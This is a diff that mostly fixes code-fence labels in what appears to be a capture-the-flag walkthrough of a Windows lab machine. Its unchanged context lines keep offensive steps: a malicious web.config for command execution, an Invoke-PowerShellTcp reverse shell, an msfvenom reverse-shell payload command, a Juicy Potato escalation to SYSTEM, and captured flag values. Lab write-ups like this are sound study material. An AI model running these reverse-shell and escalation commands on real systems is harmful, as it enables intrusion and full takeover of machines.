@@ -205,9 +205,8 @@ r
 - For this exploitation technique, I first tested with a simple ICMP callback using ping to verify command execution.
 - Here's the malicious web.config file:
 
-aspx
 
-```aspx
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -253,9 +252,9 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 1337
 
 - Modified web.config to download and execute the PowerShell script:
 
-aspx
 
-```aspx
+
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -292,7 +291,6 @@ Response.Write(o)
 
 - User Flag:
 
-lua
 
 ```lua
 67eea4d3b99884133851d163f65ea35b
@@ -319,7 +317,6 @@ lua
 
 - Next, I generated a reverse shell payload using msfvenom:
 
-bash
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe -o reverse.exe
@@ -331,7 +328,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe -o 
 
 - Finally, I executed Juicy Potato with the following command to trigger my reverse shell as NT AUTHORITY\SYSTEM:
 
-bash
 
 ```bash
 jp.exe -l 1337 -t * -p reverse.exe
@@ -348,7 +344,6 @@ jp.exe -l 1337 -t * -p reverse.exe
 
 ![Pasted image 20250519213946.png](images/Pasted_image_20250519213946.png)
 
-lua
 
 ```lua
 a548f17dc9a5f08ddf23aed3c152d834
